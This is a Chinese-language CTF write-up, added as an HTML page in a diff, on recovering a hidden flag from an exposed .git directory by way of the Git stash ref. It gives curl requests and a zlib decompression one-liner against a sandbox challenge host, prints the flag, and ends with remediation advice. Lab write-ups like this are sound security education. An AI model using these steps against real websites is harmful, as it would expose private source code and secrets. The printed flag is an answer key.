@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub Git泄露 Stash Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 780px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.88em; line-height: 1.55; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - 信息泄露 - Git泄露（Stash）</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># 信息泄露</span>
+            <span class="tag"># Git</span>
+            <span class="tag"># Stash</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>Git泄露 - Stash</li>
+            <li><strong>题目方向：</strong>Web - 信息泄露</li>
+            <li><strong>题目提示：</strong>站点自动部署时错误公开了 <code>.git</code> 目录，需要恢复仓库中的隐藏内容。</li>
+            <li><strong>解题目标：</strong>从 Git stash 保存的临时工作现场中恢复 Flag。</li>
+        </ul>
+
+        <h2>二、漏洞原理</h2>
+        <p>Git 的 <code>stash</code> 用于临时保存尚未提交的工作区修改。执行 <code>git stash</code> 后，Git 会创建一个特殊的 stash commit，并把引用保存在 <code>.git/refs/stash</code> 中。</p>
+        <p>stash commit 通常包含两个父提交：一个对应原分支，另一个对应当时的索引状态，同时它拥有自己的 tree。即使这些修改没有进入正常分支历史，只要 Web 服务公开了 <code>.git</code>，就可以通过引用和 loose object 将该工作现场完整恢复。</p>
+
+        <h2>三、解题步骤</h2>
+        <ol>
+            <li>
+                <strong>确认 Git 目录泄露：</strong>访问 <code>/.git/HEAD</code>，返回 <code>200 OK</code>，指向 <code>refs/heads/master</code>。
+                <pre>curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/HEAD"
+
+HTTP/1.1 200 OK
+ref: refs/heads/master</pre>
+            </li>
+            <li>
+                <strong>检查分支提交和 HEAD 日志：</strong>当前 master 指向 <code>2234ea7c90ee0e3002f3829efa0fb11d41b8d1a4</code>。日志中存在“add flag”和“remove flag”提交，但最新工作区没有 Flag。
+                <pre>curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/refs/heads/master"
+curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/logs/HEAD"</pre>
+            </li>
+            <li>
+                <strong>发现 stash 引用：</strong>题目名为 Stash，因此继续读取 <code>refs/stash</code> 和对应的 reflog：
+                <pre>curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/refs/stash"
+
+819b39c135bd3a43dd4b4e6354cf44fd85b9ffe0</pre>
+                reflog 显示该对象是 <code>WIP on master: 64811d6 add flag</code>，说明需要恢复已被 stash 保存的工作现场。
+            </li>
+            <li>
+                <strong>解析 stash commit：</strong>下载 SHA-1 对应的 loose object，并使用 zlib 解压。Git 对象解压后的格式为 <code>类型 长度\0内容</code>。
+                <pre>curl.exe -o stash.z "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/objects/81/9b39c135bd3a43dd4b4e6354cf44fd85b9ffe0"
+
+python -c "import zlib; print(zlib.decompress(open('stash.z','rb').read()).decode())"</pre>
+                stash commit 内容如下：
+                <pre>commit 281
+tree 60e25b35215763defc1a743a73386cd9bd6f9083
+parent 64811d690b7e238f43dc1848db78366382194157
+parent 13cb800371870caca5be8cbf47b7e11cb14425b4
+author CTFHub &lt;sandbox@ctfhub.com&gt; 1789987627 +0000
+committer CTFHub &lt;sandbox@ctfhub.com&gt; 1789987627 +0000
+
+WIP on master: 64811d6 add flag</pre>
+            </li>
+            <li>
+                <strong>递归恢复 stash tree：</strong>从 commit 的 <code>tree 60e25b35215763defc1a743a73386cd9bd6f9083</code> 开始，解析 tree 条目并继续下载其引用的 blob。恢复出的文件包含：
+                <pre>2719593894302.txt
+50x.html
+index.html</pre>
+                也可以先使用 GitHack 恢复仓库，再进入恢复目录执行 <code>git stash list</code> 和 <code>git stash show -p</code> 检查 stash。
+            </li>
+            <li>
+                <strong>读取 Flag：</strong>打开随机名称的文件 <code>2719593894302.txt</code>：
+                <pre>ctfhub{a74c54f68bc500222b7ffa0e}</pre>
+            </li>
+        </ol>
+
+        <div class="note">
+            提示：stash 的内容不属于当前分支的正常提交链，只沿 HEAD 的 parent 回溯可能会遗漏。发现 Git 泄露后应同时检查 <code>refs/stash</code>、reflog、index、packed-refs 和悬空对象。
+        </div>
+
+        <h2>四、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{a74c54f68bc500222b7ffa0e}
+        </div>
+
+        <h2>五、修复建议</h2>
+        <ul>
+            <li>禁止 Web 服务器访问 <code>.git</code>、<code>.svn</code>、<code>.hg</code> 等版本控制目录。</li>
+            <li>部署时只发布构建产物，不要将包含完整仓库元数据的目录放到 Web 根目录。</li>
+            <li>使用 Nginx 或 Apache 统一拦截隐藏文件和敏感路径。</li>
+            <li>若敏感信息曾进入 stash、提交历史或悬空对象，应轮换相关凭据并清理 Git 历史。</li>
+            <li>上线检查时验证 <code>/.git/HEAD</code>、<code>/.git/refs/stash</code> 等路径均返回 <code>404</code>。</li>
+        </ul>
+
+        <h2>六、解题总结</h2>
+        <p>本题的关键是识别 Git stash 引用。只恢复 master 当前版本或普通提交历史无法得到 Flag，而 <code>refs/stash</code> 指向的 commit 保存了额外的 tree 和 blob。通过解析 loose object 并递归恢复该 tree，最终从 stash 工作现场中提取出 Flag。</p>
+    </div>
+</body>
+</html>
